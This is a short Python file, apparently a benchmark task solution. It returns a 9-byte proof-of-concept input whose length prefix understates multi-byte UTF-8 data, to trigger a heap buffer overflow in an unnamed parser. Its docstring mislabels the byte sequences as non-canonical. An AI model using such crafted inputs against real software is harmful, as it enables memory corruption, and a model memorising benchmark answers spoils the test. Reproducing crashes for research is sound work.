class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a heap buffer overflow.

        The vulnerability is based on a common bug in UTF-8 string processing where
        the code reads a character count `N`, allocates a buffer of size `N`, but then
        reads `N` characters, which can occupy more than `N` bytes if multi-byte
        characters are present.

        To create a 9-byte PoC, we use a 2-byte length prefix and 7 bytes of data.
        We choose a character count `N` that is smaller than the actual byte length
        of the string data. To maximize the overflow severity, we minimize `N`.

        - The smallest `N` for 7 bytes of data is 2 (e.g., a 3-byte char and a 4-byte char).
        - We set the length prefix to `N=2` (b'\x00\x02').
        - The string data consists of a 3-byte and a 4-byte non-canonical UTF-8 sequence.

        This causes the vulnerable program to allocate a small buffer (for 2 chars)
        but write 7 bytes into it, triggering a heap buffer overflow.
        """

        # Length prefix: 2 bytes, indicating 2 characters to be read.
        length_prefix = b'\x00\x02'

        # String data: 7 bytes, representing 2 multi-byte characters.
        # This consists of a 3-byte and a 4-byte non-canonical UTF-8 sequence.
        string_data = b'\xe0\xa0\x80\xf0\x90\x80\x80'

        # The final PoC is the concatenation of the length and data.
        return length_prefix + string_data